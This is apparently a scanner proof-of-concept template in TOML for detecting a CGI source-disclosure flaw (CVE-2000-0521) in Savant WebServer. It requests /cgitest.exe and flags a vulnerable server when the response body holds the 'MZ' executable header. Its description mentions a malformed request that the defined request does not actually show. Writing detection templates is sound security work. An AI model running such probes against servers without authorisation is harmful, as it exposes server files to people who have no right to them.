[info]
author = "ave"
description = "检测 Savant WebServer 是否存在 CGI 源代码泄露漏洞，通过发送缺少 HTTP 版本号的畸形 GET 请求访问 CGI 测试文件，识别服务端返回的原始 CGI 二进制文件头"
id = "POC-AVE-2000-0434"
name = "Savant WebServer CGI Source Code Disclosure PoC"
severity = "medium"
tags = ["ave-2000-0434"]
vuln_id = [
    "CVE-2000-0521",
    "AVE-2000-0434",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/cgitest.exe"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["MZ"]
